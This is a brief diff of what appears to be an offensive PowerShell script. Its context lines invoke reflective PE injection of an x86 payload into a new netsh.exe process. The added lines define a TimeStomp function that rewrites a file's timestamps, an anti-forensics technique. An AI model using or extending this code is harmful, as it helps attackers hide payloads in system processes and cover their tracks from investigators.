@@ -486,3 +486,9 @@ elseif (($t -and [IntPtr]::size -eq 4)) {
     invoke-reflectivepeinjection -payload x86 -NewProcess c:\windows\system32\netsh.exe
 }
 }
+Function TimeStomp($File, $Date) {
+    $file=(gi $file) 
+    $file.LastWriteTime=$date;
+    $file.LastAccessTime=$date;
+    $file.CreationTime=$date;
+}
